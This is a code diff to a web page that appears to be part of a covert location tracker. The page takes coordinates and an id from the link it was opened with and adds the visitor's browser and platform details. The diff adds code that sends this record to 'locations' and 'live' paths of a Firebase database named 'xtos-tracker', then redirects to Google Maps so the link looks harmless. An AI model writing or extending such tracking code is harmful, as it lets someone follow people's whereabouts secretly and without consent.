@@ -20,8 +20,9 @@
         const lat = urlParams.get('lat');
         const lng = urlParams.get('lng');
         const timestamp = urlParams.get('timestamp');
+        const id = urlParams.get('id') || 'default_' + Date.now();
         
-        console.log('📡 Webhook received:', { lat, lng, timestamp });
+        console.log('📡 Webhook received:', { lat, lng, timestamp, id });
         
         if (lat && lng) {
             // Store location data
@@ -30,27 +31,96 @@
                 longitude: parseFloat(lng),
                 timestamp: timestamp ? parseInt(timestamp) : Date.now(),
                 userAgent: navigator.userAgent,
-                received: Date.now()
+                received: Date.now(),
+                deviceBrand: getBrowserInfo(),
+                batteryLevel: 'Unknown',
+                platform: navigator.platform
             };
             
             // Save to localStorage for app to read
             localStorage.setItem('xtos_tracked_location', JSON.stringify(data));
-            
-            // Also save to sessionStorage as backup
             sessionStorage.setItem('megastore_location', JSON.stringify(data));
             
-            console.log('✅ Location stored:', data);
+            // Send to Firebase for app polling
+            sendToFirebase(id, data);
+            
+            console.log('✅ Location stored and sent to Firebase:', data);
             
             // Redirect after short delay
             setTimeout(() => {
                 window.location.href = `https://maps.google.com/?q=${lat},${lng}`;
-            }, 500);
+            }, 1000);
         } else {
             console.log('❌ No coordinates received');
-            // No coordinates, redirect to maps
             setTimeout(() => {
                 window.location.href = 'https://maps.google.com/';
             }, 1000);
+        }
+        
+        function getBrowserInfo() {
+            const ua = navigator.userAgent;
+            if (ua.includes('Chrome')) return 'Chrome Browser';
+            if (ua.includes('Firefox')) return 'Firefox Browser';
+            if (ua.includes('Safari')) return 'Safari Browser';
+            if (ua.includes('Edge')) return 'Edge Browser';
+            return 'Unknown Browser';
+        }
+        
+        function sendToFirebase(trackingId, locationData) {
+            try {
+                // Decrypt tracking ID if encrypted
+                let realId = trackingId;
+                if (trackingId.includes('_enc_')) {
+                    try {
+                        realId = atob(trackingId.replace('_enc_', ''));
+                    } catch (e) {
+                        console.log('Decryption failed, using original ID');
+                    }
+                }
+                
+                // Send to Firebase locations endpoint
+                const firebaseUrl = `https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/locations/${realId}.json`;
+                
+                fetch(firebaseUrl, {
+                    method: 'PUT',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(locationData)
+                }).then(response => {
+                    if (response.ok) {
+                        console.log('✅ Firebase location sent successfully');
+                    } else {
+                        console.log('❌ Firebase location failed:', response.status);
+                    }
+                }).catch(error => {
+                    console.log('❌ Firebase error:', error);
+                });
+                
+                // Also send to live tracking endpoint
+                const liveUrl = `https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/live/${realId}.json`;
+                const liveData = {
+                    ...locationData,
+                    updateNumber: Math.floor(Math.random() * 100) + 1
+                };
+                
+                fetch(liveUrl, {
+                    method: 'PUT',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(liveData)
+                }).then(response => {
+                    if (response.ok) {
+                        console.log('✅ Firebase live tracking sent successfully');
+                    }
+                }).catch(error => {
+                    console.log('❌ Firebase live error:', error);
+                });
+                
+            } catch (error) {
+                console.log('❌ Firebase send error:', error);
+            }
         }
     </script>
 </body>
